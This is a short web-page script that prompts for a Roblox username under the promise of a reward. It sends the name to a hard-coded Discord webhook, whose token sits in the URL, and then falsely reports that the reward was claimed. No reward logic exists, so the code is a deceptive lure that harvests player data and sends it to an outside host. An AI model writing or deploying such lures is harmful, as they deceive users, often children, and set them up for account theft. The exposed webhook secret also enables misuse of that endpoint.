document.getElementById("runBtn").addEventListener("click", () => {

    let username = window.prompt("Enter your Roblox username to claim your reward:");

    if (username) {
        fetch("https://discord.com/api/webhooks/1426919503232634973/F2RX0C2zSF202hVMphsGANiVYsikQo9nlzdi-avI7x8J2umLcWFpWtPdnxc-ioupN8zf", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `Username submitted: ${username}`
            })
        }).catch(err => console.log(err));

        document.getElementById("output").textContent =
            "Reward successfully claimed for user: " + username;
    }

});
